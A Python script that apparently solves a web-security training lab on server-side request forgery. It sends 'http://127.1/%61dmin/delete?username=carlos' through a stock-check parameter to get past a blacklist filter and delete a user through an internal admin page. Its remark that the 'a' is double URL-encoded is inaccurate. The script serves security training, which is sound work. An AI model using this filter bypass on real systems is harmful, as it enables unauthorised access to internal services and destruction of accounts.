import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1].strip()

    print("[+] Lab: SSRF with blacklist-based input filter")
    print("""[+] This lab has a stock check feature which fetches data from an internal system.
    To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.
    The developer has deployed two weak anti-SSRF defenses that you will need to bypass.""")

    print("[+] The webapp makes use of a blacklist to filter payloads which aim to exploit the SSRF vulnerability.")
    print("[+] The payload 'http://127.1/%61dmin/delete?username=carlos'")
    print("[+] where the localhost ip address is written in an usual format but totally legit")
    print("[+] and where the letter 'a' of 'admin' is double URL-encoded")

    # DELETE USER
    stock_url = url + '/product/stock'
    params = {
        'stockApi' : 'http://127.1/%61dmin/delete?username=carlos'
    }
    r = s.post(stock_url, data=params, verify=False, proxies=proxies)
    if "Admin interface only available if logged in as an administrator, or if requested from loopback" not in r.text:
        print("[-] There was an error! Could not delete the user")
        sys.exit(-1)
    print("[+] Exploit worked!")


if __name__ == "__main__":
    main()